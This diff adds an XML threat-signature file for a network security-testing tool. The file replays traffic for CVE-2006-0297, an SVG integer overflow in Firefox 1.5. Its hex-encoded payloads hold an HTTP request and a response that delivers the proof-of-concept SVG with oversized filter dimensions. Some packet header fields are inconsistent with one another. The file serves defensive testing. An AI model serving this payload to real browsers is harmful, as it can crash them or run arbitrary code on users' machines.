@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Mozilla Products Graphics and XML Features Integer Overflows (IPv6 Version)"/>
+    <EngDesc display="true" value="There exists an integer overflow in certain versions of Mozilla products. The vulnerability exists in the Scalable Vector Graphics (SVG) rendering engine. A remote attacker may leverage the vulnerability by enticing the victim to visit a malicious web page. Exploitation may lead to memory corruption which can result in denial of service or execution of arbitrary code under the security context of the currently logged in user. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Mozilla"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Mozilla_Firefox"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Mozilla_Firefox_1.5"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20060202-10"/>
+    <CVEID display="true" value="CVE-2006-0297"/>
+    <bugtraqID display="true" value="16476"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="ba37725e8f4c46edffa94bb16b5a297b"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1220017734"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1203389420" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="L"/>
+  </Variables>
+  <Loops>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="G">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F7E7468652F3032303330362F706F632E73766720485454502F312E310D0A486F73743A20677378320D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E303B20656E2D55533B2072763A312E39613129204765636B6F2F32303035313132372046697265666F782F312E3661310D0A4163636570743A20746578742F786D6C2C6170706C69636174696F6E2F786D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C746578742F68746D6C3B713D302E392C746578742F706C61696E3B713D302E382C696D6167652F706E672C2A2F2A3B713D302E350D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174650D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="G" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205361742C2030342046656220323030362030323A33353A353020474D540D0A5365727665723A204170616368652F322E302E3436202843656E744F5329205048502F342E332E320D0A4C6173742D4D6F6469666965643A205361742C2030342046656220323030362030323A32393A313020474D540D0A455461673A20226563633061302D3262612D6362366563393830220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203639380D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F786D6C0D0A0D0A3C3F786D6C2076657273696F6E3D22312E3022207374616E64616C6F6E653D226E6F223F3E0D0A3C21444F435459504520737667205055424C494320222D2F2F5733432F2F4454442053564720312E312F2F454E22200D0A22687474703A2F2F7777772E77332E6F72672F47726170686963732F5356472F312E312F4454442F73766731312E647464223E0D0A3C212D2D0D0A436F707972696768742047656F7267692047756E696E736B690D0A4C6963656E6365206772616E74656420746F204D6F7A696C6C6120436F72706F726174696F6E0D0A2D2D3E0D0A0D0A0D0A3C7376672077696474683D223130302522206865696768743D2231303025222076657273696F6E3D22312E31220D0A786D6C6E733D22687474703A2F2F7777772E77332E6F72672F323030302F737667223E0D0A0D0A3C646566733E0D0A3C66696C7465722069643D224D7946696C746572222066696C746572556E6974733D227573657253706163654F6E557365220D0A783D22302220793D2230222077696474683D22333237363922206865696768743D223332373639223E0D0A0D0A3C6665476175737369616E426C757220696E3D22536F75726365416C7068612220737464446576696174696F6E3D22342220726573756C743D22626C7572222F3E0D0A0D0A3C2F66696C7465723E0D0A3C2F646566733E0D0A0D0A3C7265637420783D22312220793D2231222077696474683D2231393822206865696768743D22313138222066696C6C3D222363636363636322202F3E0D0A0D0A3C672066696C7465723D2275726C28234D7946696C74657229223E0D0A3C746578742066696C6C3D222346464646464622207374726F6B653D22626C61636B2220666F6E742D73697A653D223435220D0A783D2234322220793D223432223E4665636B2062316C6C3C2F746578743E0D0A3C2F673E0D0A0D0A3C2F7376673E0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+  <Stateful display="false" value="true"/>
+  <DestIPVarName display="false" value="$destIP"/>
+</threatSignature>
